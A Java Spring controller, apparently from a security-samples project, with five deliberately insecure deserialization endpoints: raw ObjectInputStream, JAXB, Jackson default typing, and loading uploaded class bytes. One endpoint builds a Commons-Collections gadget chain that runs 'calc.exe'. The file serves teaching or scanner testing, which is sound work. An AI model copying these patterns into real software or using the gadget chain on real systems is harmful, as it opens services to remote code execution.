package com.freedom.securitysamples.api.unsafeDeserialization;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import ognl.OgnlException;
import org.springframework.web.bind.annotation.*;
import javax.xml.bind.JAXBContext;
import javax.xml.bind.Unmarshaller;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.security.SecureClassLoader;
import java.util.HashMap;
import java.util.Map;

@RestController
@RequestMapping("/api")
public class DeserializeController {

    // 1. 原始的不安全反序列化示例
    @GetMapping("/deserialize/bad01")
    public String deserializePayload(String serializedData) throws OgnlException, IOException, ClassNotFoundException {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData.getBytes(StandardCharsets.UTF_8));
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        Object deserializedObject = objectInputStream.readObject();
        return "{'msg':'false'}";
    }

    // 2. 使用XML反序列化的不安全示例
    @PostMapping("/deserialize/bad02")
    public String xmlDeserialize(@RequestBody String xmlData) {
        try {
            JAXBContext context = JAXBContext.newInstance(Object.class);
            Unmarshaller unmarshaller = context.createUnmarshaller();
            Object obj = unmarshaller.unmarshal(new StringReader(xmlData));
            return "Success";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    // 3. 使用Jackson反序列化的不安全示例
    @PostMapping("/deserialize/bad03")
    public String jsonDeserialize(@RequestBody String jsonData) {
        try {
            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping(); // 不安全的配置
            Object obj = mapper.readValue(jsonData, Object.class);
            return "Success";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    // 4. 使用Commons-Collections的不安全示例
    @GetMapping("/deserialize/bad04")
    public String commonCollectionsVulnerability() {
        try {
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",
                            new Class[] { String.class, Class[].class },
                            new Object[] { "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke",
                            new Class[] { Object.class, Object[].class },
                            new Object[] { null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class },
                            new Object[] { "calc.exe" })
            };

            Transformer transformerChain = new ChainedTransformer(transformers);
            Map<String, String> map = new HashMap<String, String>();
            map.put("value", "value");
            Map<String, String> transformedMap = TransformedMap.decorate(map, null, transformerChain);

            // 序列化示例
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(transformedMap);
            oos.close();

            return "Created vulnerable object";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    // 5. 使用自定义类加载器的不安全示例
    @PostMapping("/deserialize/bad05")
    public String customClassLoaderDeserialize(@RequestBody byte[] classData) {
        try {
            CustomClassLoader loader = new CustomClassLoader(getClass().getClassLoader());
            Class<?> loadedClass = loader.defineCustomClass("CustomClass", classData);
            Object instance = loadedClass.newInstance();
            return "Loaded class: " + instance.getClass().getName();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}

// 修正后的自定义类加载器
class CustomClassLoader extends SecureClassLoader {
    public CustomClassLoader(ClassLoader parent) {
        super(parent);
    }

    // 提供一个公共方法来加载类
    public Class<?> defineCustomClass(String name, byte[] classData) {
        // 使用protected的defineClass方法
        return defineClass(name, classData, 0, classData.length);
    }

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        throw new ClassNotFoundException("Custom class loader does not implement findClass");
    }
}